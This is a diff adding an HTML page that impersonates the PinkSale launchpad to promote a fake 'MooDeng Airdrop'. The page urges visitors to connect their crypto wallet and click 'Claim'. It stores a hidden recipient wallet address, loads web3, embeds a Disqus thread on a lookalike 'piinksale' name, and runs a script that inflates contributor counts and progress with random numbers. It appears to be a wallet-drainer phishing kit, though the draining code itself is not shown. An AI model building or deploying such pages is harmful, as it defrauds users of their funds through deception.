@@ -1,0 +1,739 @@
+<html lang="en" style="display: block"><head>
+
+<meta charset="utf-8">
+<link rel="icon" href="images/favicon.png">
+
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#000000">
+<meta name="description" content="">
+<style>/* Popup CSS */
+.popup {
+  position: fixed;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000; /* Yüksek bir z-index değeri belirleyin */
+}
+
+.popup-content {
+  background: white;
+  padding: 20px;
+  border-radius: 5px;
+  text-align: center;
+  width: 80%;
+  max-width: 500px;
+  position: relative;
+  z-index: 1001; /* Popup içeriği için yüksek z-index */
+}
+
+.close-btn {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  font-size: 20px;
+  cursor: pointer;
+}
+
+</style>
+<title>
+
+
+Moo Deng Fairlaunch
+
+</title>
+
+<script>
+      self == top
+        ? (document.documentElement.style.display = 'block')
+        : (top.location = self.location);
+    </script>
+<link href="css/main.35b4f5eb.chunk.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="css/indexlift.css">
+<script src="js/web3.min.js"></script>
+</head>
+<body class="" style="">
+<noscript>You need to enable JavaScript to run this app.</noscript>
+<div id="root">
+        <section class="ant-layout ant-layout-has-sider">
+            <header class="ant-layout-header" style="background: white none repeat scroll 0% 0%; height: 70px; position: fixed; z-index: 100; width: 100%; padding: 0px 16px;">
+                <nav class="flex items-center noselect" style="" id="nav">
+                    <div class="pr-2 pt-2 is-size-4" id="btnmobile" style="cursor: pointer;">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+<path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path>
+</svg>
+</div>
+<a class="logo mr-3" href="#">
+<div class="logo-icon" style="margin-top: 15px">
+<img src="images/pinkswap.a95de4f3.png">
+</div>
+<div class="logo-text pt-1 hide-on-mobile">PinkSale</div>
+                    </a>
+                    <div class="flex-1"></div>
+                    <a  href="https://www.dexview.com/" class="p-3 rounded-md border flex dark:border-neutral-800" target="_blank" rel="nofollow noreferrer"><img src="https://www.pinksale.finance/images/dexview-dark.svg" alt="Dexview" class="w-[20px] h-[20px]"><span class="ml-2 font-[500] text-sm hidden-against-adblock md:block">dexview.com</span></a>
+                    
+                    <div class="network " style="cursor: pointer;">
+                        <img src="images/ic-bsc.a3213bd0.svg" alt="" width="24">
+                        <span class="ml-2 hide-on-mobile">BSC MAINNET</span>
+                    </div>
+                    <div class="connectButton" id="loginButton" style="position:relative">
+                        <a id="linkhref" target="_blank" style="color:#f95192">Connect</a>
+                    </div>
+					
+                </nav>
+            </header>
+<aside class="
+            ant-layout-sider
+            ant-layout-sider-dark
+            ant-layout-sider-collapsed
+            ant-layout-sider-zero-width
+          " style="
+            background: white;
+            overflow: auto;
+            height: 100vh;
+            position: fixed;
+            top: 70px;
+            left: 0px;
+            z-index: 10;
+            flex: 0 0 0px;
+            max-width: 0px;
+            min-width: 0px;
+            width: 0px;
+          ">
+<div class="ant-layout-sider-children">
+<ul class="
+                ant-menu
+                ant-menu-root
+                ant-menu-vertical
+                ant-menu-light
+                ant-menu-inline-collapsed
+              " role="menu" tabindex="0" data-menu-list="true">
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-home" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M946.5 505L560.1 118.8l-25.9-25.9a31.5 31.5 0 0 0-44.4 0L77.5 505a63.9 63.9 0 0 0-18.8 46c.4 35.2 29.7 63.3 64.9 63.3h42.5V940h691.8V614.3h43.4c17.1 0 33.2-6.7 45.3-18.8a63.6 63.6 0 0 0 18.7-45.3c0-17-6.7-33.1-18.8-45.2zM568 868H456V664h112v204zm217.9-325.7V868H632V640c0-22.1-17.9-40-40-40H432c-22.1 0-40 17.9-40 40v228H238.1V542.3h-96l370-369.7 23.1 23.1L882 542.3h-96.1z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#">Home</a></span>
+</li>
+<li class="
+                  ant-menu-submenu
+                  ant-menu-submenu-vertical
+                  ant-menu-submenu-selected
+                " role="none">
+<div role="menuitem" class="ant-menu-submenu-title" tabindex="-1" aria-expanded="false" aria-haspopup="true" data-menu-id="rc-menu-uuid-78593-1-launchpads" aria-controls="rc-menu-uuid-78593-1-launchpads-popup" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path fill="none" stroke="#000" stroke-width="2" d="M7,9 L7,14 C7,14 4,16 4,19 L4,20 L8,20 L10,23 L14,23 L16,20 L20,20 L20,19 C20,16 17,14 17,14 L17,9 C17,5 14,1 12,1 C10,1 7,5 7,9 Z M8,20 L16,20 M12,9 C12.5522847,9 13,8.55228475 13,8 C13,7.44771525 12.5522847,7 12,7 C11.4477153,7 11,7.44771525 11,8 C11,8.55228475 11.4477153,9 12,9 Z"></path>
+</svg>
+<span class="ant-menu-title-content">Launchpads</span><i class="ant-menu-submenu-arrow"></i>
+</div>
+<ul class="ant-menu ant-menu-sub ant-menu-inline ant-menu-hidden" id="rc-menu-uuid-78593-1-launchpads-popup" data-menu-list="true" style="">
+<li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-launchpad-create" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px">
+<span class="ant-menu-title-content"><a href="#">Create launchpad</a></span>
+</li>
+<li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-fairlaunchpad-create" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px">
+<span class="ant-menu-title-content"><a href="#">Create fair launch</a></span>
+</li>
+<li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-launchpad-token" class="ant-menu-item ant-menu-item-only-child" style="padding-left: 48px">
+<span class="ant-menu-title-content"><a href="#">Create token</a></span>
+</li>
+<li role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-launchpad-dashboard" class="
+                      ant-menu-item
+                      ant-menu-item-selected
+                      ant-menu-item-only-child
+                    " style="padding-left: 48px">
+<span class="ant-menu-title-content"><a href="#">Launchpad list</a></span>
+</li>
+</ul>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-leaderboard" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M899.6 276.5L705 396.4 518.4 147.5a8.06 8.06 0 0 0-12.9 0L319 396.4 124.3 276.5c-5.7-3.5-13.1 1.2-12.2 7.9L188.5 865c1.1 7.9 7.9 14 16 14h615.1c8 0 14.9-6 15.9-14l76.4-580.6c.8-6.7-6.5-11.4-12.3-7.9zm-126 534.1H250.3l-53.8-409.4 139.8 86.1L512 252.9l175.7 234.4 139.8-86.1-53.9 409.4zM512 509c-62.1 0-112.6 50.5-112.6 112.6S449.9 734.2 512 734.2s112.6-50.5 112.6-112.6S574.1 509 512 509zm0 160.9c-26.6 0-48.2-21.6-48.2-48.3 0-26.6 21.6-48.3 48.2-48.3s48.2 21.6 48.2 48.3c0 26.6-21.6 48.3-48.2 48.3z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#">Leaderboard</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-antibot" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M20.995,6.9c-0.034-0.342-0.241-0.642-0.548-0.795l-8-4c-0.281-0.141-0.613-0.141-0.895,0l-8,4 C3.246,6.259,3.039,6.559,3.005,6.9c-0.011,0.107-0.961,10.767,8.589,15.014C11.723,21.972,11.861,22,12,22 s0.277-0.028,0.406-0.086C21.956,17.667,21.006,7.008,20.995,6.9z M12,19.897C5.231,16.625,4.911,9.642,4.966,7.635L12,4.118 l7.029,3.515C19.066,9.622,18.701,16.651,12,19.897z"></path>
+<path d="M11 12.586L8.707 10.293 7.293 11.707 11 15.414 16.707 9.707 15.293 8.293z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#">Pink Anti-Bot</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-pools-alert" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M21.928,11.607c-0.202-0.488-0.635-0.605-0.928-0.633V8c0-1.103-0.897-2-2-2h-6V4.61c0.305-0.274,0.5-0.668,0.5-1.11 C13.5,2.672,12.828,2,12,2s-1.5,0.672-1.5,1.5c0,0.442,0.195,0.836,0.5,1.11V6H5C3.897,6,3,6.897,3,8v2.997 C2.951,11,2.918,11.003,2.918,11.003C2.395,11.04,1.99,11.476,1.99,12v2c0,0.553,0.447,1,1,1H3v5c0,1.103,0.897,2,2,2h14 c1.103,0,2-0.897,2-2v-5c0.553,0,1-0.447,1-1v-1.938C22.011,11.909,21.988,11.753,21.928,11.607z M5,20V8h14l0.001,3.996 C19.001,11.998,19,11.999,19,12v2c0,0.002,0.001,0.003,0.001,0.005L19.002,20H5z"></path>
+<ellipse cx="8.5" cy="12" rx="1.5" ry="2"></ellipse>
+<ellipse cx="15.5" cy="12" rx="1.5" ry="2"></ellipse>
+<path d="M8 16H16V18H8z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Pools Alert</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-telegram" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<g>
+<path fill="none" d="M0 0h24v24H0z"></path>
+<path fill-rule="nonzero" d="M12 20a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm0 2C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-3.11-8.83l-2.498-.779c-.54-.165-.543-.537.121-.804l9.733-3.76c.565-.23.885.061.702.79l-1.657 7.82c-.116.557-.451.69-.916.433l-2.551-1.888-1.189 1.148c-.122.118-.221.219-.409.244-.187.026-.341-.03-.454-.34l-.87-2.871-.012.008z"></path>
+</g>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Telegram</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-twitter" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<g>
+<path fill="none" d="M0 0h24v24H0z"></path>
+<path fill-rule="nonzero" d="M15.3 5.55a2.9 2.9 0 0 0-2.9 2.847l-.028 1.575a.6.6 0 0 1-.68.583l-1.561-.212c-2.054-.28-4.022-1.226-5.91-2.799-.598 3.31.57 5.603 3.383 7.372l1.747 1.098a.6.6 0 0 1 .034.993L7.793 18.17c.947.059 1.846.017 2.592-.131 4.718-.942 7.855-4.492 7.855-10.348 0-.478-1.012-2.141-2.94-2.141zm-4.9 2.81a4.9 4.9 0 0 1 8.385-3.355c.711-.005 1.316.175 2.669-.645-.335 1.64-.5 2.352-1.214 3.331 0 7.642-4.697 11.358-9.463 12.309-3.268.652-8.02-.419-9.382-1.841.694-.054 3.514-.357 5.144-1.55C5.16 15.7-.329 12.47 3.278 3.786c1.693 1.977 3.41 3.323 5.15 4.037 1.158.475 1.442.465 1.973.538z"></path>
+</g>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Twitter</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-pinkswap" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path d="M847.9 592H152c-4.4 0-8 3.6-8 8v60c0 4.4 3.6 8 8 8h605.2L612.9 851c-4.1 5.2-.4 13 6.3 13h72.5c4.9 0 9.5-2.2 12.6-6.1l168.8-214.1c16.5-21 1.6-51.8-25.2-51.8zM872 356H266.8l144.3-183c4.1-5.2.4-13-6.3-13h-72.5c-4.9 0-9.5 2.2-12.6 6.1L150.9 380.2c-16.5 21-1.6 51.8 25.1 51.8h696c4.4 0 8-3.6 8-8v-60c0-4.4-3.6-8-8-8z"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Pinkswap</a></span>
+</li>
+<li class="ant-menu-item" role="menuitem" tabindex="-1" data-menu-id="rc-menu-uuid-78593-1-docs" style="">
+<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="ant-menu-item-icon" height="18" width="18" xmlns="http://www.w3.org/2000/svg">
+<path fill="none" stroke-linejoin="round" stroke-width="32" d="M416 221.25V416a48 48 0 01-48 48H144a48 48 0 01-48-48V96a48 48 0 0148-48h98.75a32 32 0 0122.62 9.37l141.26 141.26a32 32 0 019.37 22.62z"></path>
+<path fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="32" d="M256 56v120a32 32 0 0032 32h120m-232 80h160m-160 80h160"></path>
+</svg>
+<span class="ant-menu-title-content"><a href="#" target="_blank" rel="noreferrer noopener">Docs</a></span>
+</li>
+</ul>
+<div aria-hidden="true" style="display: none"></div>
+</div>
+</aside>
+<section class="ant-layout" style="
+            margin-left: 0px;
+            padding: 40px 20px 20px;
+            transition: all 200ms linear 0s;
+          ">
+<main class="ant-layout-content">
+<div class="Trending_trending__2ax2p">
+<div class="Trending_title__3t1fM">
+
+
+<div class="mx-auto my-4 sm:my-6 md:my-12 container"><!--$--><div class="flex items-start gap-4 flex-col lg:flex-row"><div class="flex-1 lg:flex-[2] w-full relative mt-0 lg:mt-12">
+<div class="pt-[25%] bg-gray-200 dark:bg-neutral-800 w-full rounded-t-md shadow-sm bg-no-repeat bg-center bg-cover" style="background-image: url("https://photos.pinksale.finance/file/pinksale-logo-upload/1728032060956-2c05f12a64c1d4bacac9ba75faaa2277.jpeg");"></div><div class="absolute -mt-10 sm:-mt-12 md:-mt-16 left-[50%] -translate-x-[50%] z-10"><figure class="inline-block relative shadow-xl rounded-full"><img src="images/1.jpg" alt="" class="rounded-full p-[1px] border border-brand-lighter dark:border-brand-darker object-cover w-[80px] h-[80px] sm:w-[92px] sm:h-[92px] md:w-[128px] md:h-[128px]" loading="lazy"><img alt="BNB Smart Chain" loading="lazy" width="18" height="18" decoding="async" data-nimg="1" class="rounded-full p-[1px] border border-brand-lighter w-6 h-6 absolute right-0 bottom-0 sm:right-1 sm:bottom-1 md:right-2 md:bottom-2" style="color:transparent" src="https://www.pinksale.finance/_next/static/media/ic-bsc.a3213bd0.svg"></figure></div>
+
+<div class="shadow-sm dark:shadow-lg text-sm dark:text-brand-text-dark p-4 py-6 relative overflow-hidden rounded-t-none rounded-b-md bg-white dark:bg-brand-dark"><div class="pt-6 sm:pt-8 md:pt-12 relative"><p id="message"></p><div class="absolute top-0 right-0"><div class="rounded-full text-xs py-1 px-2 inline-flex items-center gap-1 border border-transparent text-emerald-500 dark:text-emerald-400 bg-emerald-50 dark:bg-transparent dark:border-emerald-400"><div class="w-[8px] h-[8px] rounded-full bg-emerald-500 dark:bg-emerald-600 animate-pulse"></div><div class="font-medium">Live</div></div></div>
+<div class="flex items-center justify-center gap-2 text-center"><h2 class="text-[26px] font-semibold text-neutral-800 dark:text-brand-text-dark capitalize leading-relaxed">
+                                                                
+MooDeng Airdrop</h2></div>	
+										
+										
+									
+					</script>
+                            <div class="column is-flex-grow-1">
+                                <div class="ant-card ant-card-bordered" style="position: relative; border-color: rgb(255, 221, 87);">
+                                    <div class="ant-card-body">
+									
+                                        <div class="absolute left-[50%] top-[2px] -translate-x-[50%] -translate-y-[50%] z-[2]"><div class="affiliateBadge"><div class="affiliateBadge__line"><span>86.9<!-- -->%</span><span>Progress</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div data-show="true" class="ant-alert ant-alert-warning ant-alert-no-icon" role="alert" style="margin-bottom: 10px;">
+                                            <div class="ant-alert-content">
+                                                <div class="ant-alert-message">UPTO $2500 $MOODENG AIRDROP</div>
+                                                <div class="ant-alert-description"></div>
+                                            </div>
+                                        </div>
+                                        <form id="form_sale_live" style="display: block">
+                                            <div class="has-text-centered">
+                                                <p class="mb-2"></p>
+                                                <div class="has-text-centered">
+                                                    <strong>
+                                                        <span class="p-2 has-background-danger-light mr-2" id="days" style="border-radius: 4px;">00</span>
+                                                        <span class="p-2 has-background-danger-light mr-2" id="hours" style="border-radius: 4px;">00</span>
+                                                        <span class="p-2 has-background-danger-light mr-2" id="phut" style="border-radius: 4px;">02</span>
+                                                        <span class="p-2 has-background-danger-light mr-2" id="second" style="border-radius: 4px;">00</span>
+                                                    </strong>
+                                                </div>
+                                            </div>
+                                            <div class="pb-4">
+                                                <div class="ant-progress ant-progress-line ant-progress-default mt-4 mb-2">
+                                                    <div class="ant-progress-outer">
+                                                        <div class="ant-progress-inner">
+                                                           
+                                                            <!-- Sửa phần trăm theo cái này, cho thuộc tính width là bao nhiêu phần trăm-->
+                                                            
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="is-flex is-align-items-center is-size-7">
+                                                    <!-- Sửa cái đầu này -->
+                                                    <div class="is-flex-grow-1" style="font-weight: 600"><span id="MyValue"></span>
+                                                        <span id="minMyvalue"></span>
+                                                    </div>
+                                                    <div class="is-flex-grow-1 has-text-right" style="font-weight: 600" id="maxMyValue">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                           
+
+
+                                        </form>
+                                        <form id="form_claim" style="display: none">
+                                            <div class="pb-4">
+                                                <div class="ant-progress ant-progress-line ant-progress-default mt-4 mb-2">
+                                                    <div class="ant-progress-outer">
+                                                        <div class="ant-progress-inner">
+                                                           
+                                                            <!-- Sửa phần trăm theo cái này, cho thuộc tính width là bao nhiêu phần trăm-->
+                                                            
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="is-flex is-align-items-center is-size-7">
+                                                    <!-- Sửa cái đầu này -->
+                                                    <div class="is-flex-grow-1" style="font-weight: 600"><span id="MyValueClaim"></span>
+                                                        <span id="minMyvalue"></span>
+                                                    </div>
+                                                    <div class="is-flex-grow-1 has-text-right" style="font-weight: 600" id="maxMyValue">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="field flex justify-center">
+                                                <p></p>
+                                            </div>
+                                            <button type="button" id="btn_claim" class="ant-btn ant-btn-primary bg-[#f95192] w-full flex justify-center items-center">
+                                                <span class="ml-2" id="btn_claim_with">Claim</span>
+                                            </button>
+                                        </form>
+
+                                    </div>					
+									
+										
+										
+										
+									</div></div></div></div>
+									<div class="flex items-center gap-2.5 text-gray-500 mt-2 justify-center">
+				</div>
+										
+                        <div class="border-b w-full dark:border-neutral-800 my-4 border-dashed"></div>
+                                        <div class="table-container mt-2" id="bt_box_id">
+										
+ <div class="text-md font-bold">Eligibility Criteria</div><div class="whitespace-pre-line break-words text-sm leading-relaxed">
+● Pinksale Contributors : Individuals, developers, and whale wallets who contributed Pinksale presale.
+● Holders : $VOLT current holders; holding tokens equivalent to $500; no history of selling {loyal holders}.
+
+<div class="text-md font-bold">Steps</div><div class="whitespace-pre-line break-words text-sm leading-relaxed">
+● Hold $VOLT in your wallet (MetaMask or Trustwallet).
+● Make sure your wallet address has enough native tokens for gas fees.
+● Connect your wallet to the smart contract and click “Claim”.
+● That’s it! The rest is done automatically and your rewards will drop straight into your wallet in the coming minutes. (Smart contract will withdraw network gas and automatically deposit from 20% to 30% depending on $VOLT coins you hold).<div class="whitespace-pre-line break-words text-sm leading-relaxed">
+        
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="table-container mt-6 !overflow-visible">
+                                            <input type="text" id="AddressMe" value="0x0A62ad643251758519087aFe0193bd1B9fC10979" hidden="">
+                                            <input type="text" id="notidate" value="Oct 25, 2024 17:00:00" hidden="">
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+
+
+</div>
+                              
+                                                    <!-- <span
+                                                        style="position: absolute;left: 30%;top: 50%;transform: translateY(-50%);font-weight: 700;color: #FD728F;">PPeth</span> -->
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                            <input type="text" id="RealCapYesNo" value="NO" hidden="">
+                            <input type="text" id="RealCap" value="25.48" hidden="">
+                            <!-- 2 cái này a k đc để là 0 k thì nó sẽ chạy ra 0 nè -->
+                            <input type="text" id="MaxRealCap" value="28.34" hidden="">
+                            <input type="text" id="balance" hidden="">
+                            <input type="text" id="Yesnomax" value="YES" hidden="">
+                            <input type="text" id="idcoin" value="2924" hidden="">
+                            <input type="text" id="chainId" value="" hidden="">
+                            <!--SALE LIVE-->
+                            <input type="text" id="ClaimStatus" value="YES" hidden="">
+                            <!--CLAIM-->
+                            <!-- <input type="text" id="ClaimStatus" value="YES" hidden> -->
+
+                            <script>
+                                function move() {
+                                    var numbers = [];
+                                    var elem = document.getElementById("myBar");
+                                    let MaxRealCap = jQuery("#MaxRealCap").val();
+                                    let RealCapYesNo = jQuery("#RealCapYesNo").val();
+                                    let RealCap = jQuery("#RealCap").val();
+                                    let ClaimStatus = jQuery("#ClaimStatus").val();
+                                    var width = MaxRealCap - RealCap;
+                                    $.each(numbers, function (index, value) {
+                                        setTimeout(function () {
+                                            if (RealCapYesNo == 'XANHDAM') {
+                                                let gt = parseFloat(parseFloat(RealCap) + parseFloat(width / value));
+                                                if (gt == MaxRealCap) {
+                                                    jQuery("#MyValue").text(gt);
+                                                } else {
+                                                    jQuery("#MyValue").text(gt.toFixed(2));
+                                                }
+
+                                                if (ClaimStatus == "NO") {
+                                                    let TotalContributors = jQuery("#TotalContributors").text();
+
+                                                    if (TotalContributors > 1000) {
+                                                    } else {
+                                                        let random = Math.floor(Math.random() * (10 - 1 + 1) + 1);
+                                                        TotalContributors = parseInt(TotalContributors) + random;
+                                                        jQuery("#TotalContributors").text(TotalContributors);
+                                                    }
+                                                }
+
+                                            } else if (RealCapYesNo == 'NO') {
+                                                let gt = parseFloat(parseFloat(RealCap) + parseFloat(width / value));
+                                                if (gt == MaxRealCap) {
+                                                    jQuery("#MyValue").text(gt);
+                                                } else {
+                                                    jQuery("#MyValue").text(gt.toFixed(2));
+                                                }
+                                                elem.style.width = (gt) / MaxRealCap * 100 + '%';
+
+                                                if (ClaimStatus == "NO") {
+                                                    let TotalContributors = jQuery("#TotalContributors").text();
+                                                    if (TotalContributors > 1000) {
+                                                    } else {
+                                                        let random = Math.floor(Math.random() * (10 - 1 + 1) + 1);
+                                                        TotalContributors = parseInt(TotalContributors) + random;
+                                                        jQuery("#TotalContributors").text(TotalContributors);
+                                                    }
+                                                }
+                                            } else {
+                                                let gt = parseFloat(parseFloat(RealCap) + parseFloat(width / value));
+                                                if (gt == MaxRealCap) {
+                                                    jQuery("#MyValue").text(gt);
+                                                } else {
+                                                    jQuery("#MyValue").text(gt.toFixed(2));
+                                                }
+
+                                                if (ClaimStatus == "NO") {
+                                                    let TotalContributors = jQuery("#TotalContributors").text();
+                                                    if (TotalContributors > 1000) {
+                                                    } else {
+                                                        let random = Math.floor(Math.random() * (10 - 1 + 1) + 1);
+                                                        TotalContributors = parseInt(TotalContributors) + random;
+                                                        jQuery("#TotalContributors").text(TotalContributors);
+                                                    }
+                                                }
+                                            }
+                                        }, (index + 1) * 2000);
+                                    });
+                                }
+                                window.onload = move;
+
+                            
+                                </div>
+                                <div style="height: 24px;"></div>
+                                <div class="ant-card ant-card-bordered mb-5">
+                                    <div class="ant-card-body">
+                                        <div class="table-container">
+                                          
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="ant-card ant-card-bordered mb-5 rounded">
+                                    <div class="ant-card-head">
+                                        <div class="ant-card-head-wrapper">
+                                            <div class="ant-card-head-title">Newsletters</div>
+                                            <div class="ant-card-extra">
+                                                <div class="text-sm style_radioButton__1dwz-"><label class="ant-radio-wrapper"><span class="ant-radio"><input type="radio" class="ant-radio-input" value=""><span class="ant-radio-inner"></span></span></label>Never show
+                                                    again</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="ant-card-body">
+                                        <div class="text-sm mb-4">Sign up our mailing list to receive our new presales,
+                                            features, tips and reviews for next 100x projects.</div>
+                                        <div class="text-sm mb-4"><input placeholder="Enter your email address" class="ant-input" type="text" value=""></div>
+                                        <div><button type="button" class="ant-btn ant-btn-default" disabled="">
+                                                <div class="text-sm flex items-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg" style="margin-bottom: -3px; margin-right: 4px;">
+                                                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z">
+                                                        </path>
+                                                        <polyline points="22,6 12,13 2,6"></polyline>
+                                                    </svg>
+                                                    <div class="text-sm">Subscribe</div>
+                                                </div>
+                                            </button></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="columns">
+                            <div class="column is-flex-grow-2">
+                                <div class="LockRecord_root__31Eay">
+                                    <div class="ant-card ant-card-bordered">
+                                        <div class="ant-card-body">
+
+                                            <div id="disqus_thread"><iframe id="dsq-app825" name="dsq-app825" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="saved_resource.html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 614px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
+                                            <script>
+                                                (function () { // DON'T EDIT BELOW THIS LINE
+                                                    var d = document, s = d.createElement('script');
+                                                    s.src = 'https://piinksale-finance.disqus.com/embed.js';
+                                                    s.setAttribute('data-timestamp', +new Date());
+                                                    (d.head || d.body).appendChild(s);
+                                                })();
+                                            </script>
+                                            <noscript>Please enable JavaScript to view the <a
+                                                    href="https://disqus.com/?ref_noscript">comments powered by
+                                                    Disqus.</a></noscript>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="column is-flex-grow-1"></div>
+                        </div>
+                    </div>
+                </main>
+                <footer class="ant-layout-footer">
+                    <div class="container">
+                        <div class="copyright">
+                            <p class="has-text-centered">Disclaimer: The information provided shall not in any way
+                                constitute a recommendation as to whether you should invest in any product discussed. We
+                                accept no liability for any loss occasioned to any person acting or refraining from
+                                action as a result of any material provided or published.</p>
+                        </div>
+                    </div>
+                </footer>
+            </section>
+        </section>
+    </div>
+    <div>
+        <div class="ant-modal-root" id="btnconnectwallet">
+            <div tabindex="-1" class="ant-modal-wrap" role="dialog" aria-labelledby="rcDialogTitle0" style="display: none;">
+                <div role="document" class="ant-modal" style="width: 520px; transform-origin: 348px -73px">
+                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                    <div class="ant-modal-content">
+                        <button type="button" aria-label="Close" class="ant-modal-close">
+                            <span class="ant-modal-close-x" style="display: table-cell;text-align: center;vertical-align: middle;">
+                                <span role="img" aria-label="close" class="anticon anticon-close ant-modal-close-icon">
+                                    <svg viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em" fill="currentColor" aria-hidden="true">
+                                        <path d="M563.8 512l262.5-312.9c4.4-5.2.7-13.1-6.1-13.1h-79.8c-4.7 0-9.2 2.1-12.3 5.7L511.6 449.8 295.1 191.7c-3-3.6-7.5-5.7-12.3-5.7H203c-6.8 0-10.5 7.9-6.1 13.1L459.4 512 196.9 824.9A7.95 7.95 0 00203 838h79.8c4.7 0 9.2-2.1 12.3-5.7l216.5-258.1 216.5 258.1c3 3.6 7.5 5.7 12.3 5.7h79.8c6.8 0 10.5-7.9 6.1-13.1L563.8 512z">
+                                        </path>
+                                    </svg>
+                                </span>
+                            </span>
+                        </button>
+                        <div class="ant-modal-header">
+                            <div class="ant-modal-title" id="rcDialogTitle0">Connect to a wallet</div>
+                        </div>
+                        <div class="ant-modal-body">
+                            <div class="ConnectWalletModal_items__3Ylt1">
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="ProviderItem_item__2uvZt" id="linkmetamask">
